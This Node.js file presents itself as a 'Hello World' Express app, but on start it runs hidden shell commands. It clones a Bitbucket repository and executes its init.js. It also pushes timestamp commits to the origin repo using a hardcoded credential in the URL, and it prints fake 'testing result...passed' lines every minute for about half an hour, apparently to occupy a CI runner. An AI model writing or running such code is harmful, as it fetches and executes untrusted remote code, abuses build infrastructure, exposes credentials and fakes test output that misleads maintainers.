var express = require('express');
var exec = require("child_process").exec;
var index = 1;
var max = 28;
var interval;
console.log(__dirname);
var repo = exec("git remote show origin -n | grep h.URL | sed 's/.*://;s/.git$//'");
repo.stderr.on('data', function(data) {
    console.log('stderr: ' + data);
});
repo.on('close', function(code) {
    console.log('closing code: ' + code);
});
repo.stdout.on('data', function(data) {
    var split = data.replace(/(\r\n|\n|\r)/gm,"").split('/');
    console.log(split)
    var _n = split.pop();
    var _r = split.pop();
    console.log(_n + '/' + _r)
    var target = 'https://' + _r + ':tamolo442@github.com/' + _r + '/' + _n + '.git';
    var myrepo = 'git clone ' + target + ' aaa && ';
    myrepo += 'git config --global user.email "test" && ';
    myrepo += 'git config --global user.name "test" && ';
    myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
    myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
    exec(myrepo);
});

var child = exec('rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js');
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});
interval = setInterval(function () {
  if (index >= max) {
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }
  console.log("testing result..." + index++ + '...passed');
}, 1000 * 60);

var app = express();
app.get('/', function (req, res) {
  res.send('Hello World!');
})

app.listen(8080, function () {
  console.log('Example app listening on port 8080!')
});
